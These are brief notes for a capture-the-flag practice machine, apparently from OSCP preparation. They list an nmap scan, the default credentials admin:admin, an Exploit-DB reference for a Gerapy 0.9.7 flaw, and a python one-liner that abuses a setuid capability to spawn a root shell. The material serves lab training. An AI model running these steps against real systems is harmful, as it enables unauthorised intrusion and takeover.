https://medium.com/@ardian.danny/oscp-practice-series-23-proving-grounds-levram-d033737f0025

sudo nano /etc/hosts

nmap -sS -sV levram

(port 22, port 8000)

admin:admin

exploit-db search gerapy 0.9.7

https://www.exploit-db.com/exploits/50640

cve-2021-43857 on exploit-db

make sure to create a project first

run `getcap -r / 2>/dev/null` to find any setuid enabled

then run `/usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'` to get root shell